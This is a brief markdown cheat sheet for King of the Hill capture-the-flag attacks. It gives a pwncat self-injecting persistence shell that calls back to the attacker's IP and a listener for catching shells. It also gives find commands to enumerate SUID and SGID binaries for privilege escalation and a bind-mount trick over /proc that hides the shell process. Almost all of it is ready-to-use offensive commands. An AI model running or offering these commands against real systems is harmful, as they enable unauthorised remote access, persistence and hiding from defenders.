## KOTH attack

Persistence shell:
```
pwncat -l <PORT> --self-inject /bin/sh:<YOUR IP>:<PORT>+3
```

Connect to other shells using:
```
pwncat -l <PORT> -vv
```

Finding SUID & SGID binaries 
```
find / -perm -u=s -type f 2>/dev/null #SUID
find / -perm -g=s -type f 2>/dev/null #SGUD
```

SUID:
```
[!] Default Binaries (Don't bother)
------------------------------
/bin/umount
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/ping6
/sbin/mount.nfs
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/arping
/usr/bin/at
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
```

to hide shell (not tested) :
```
mount -o bind /empty/dir /proc/42
```
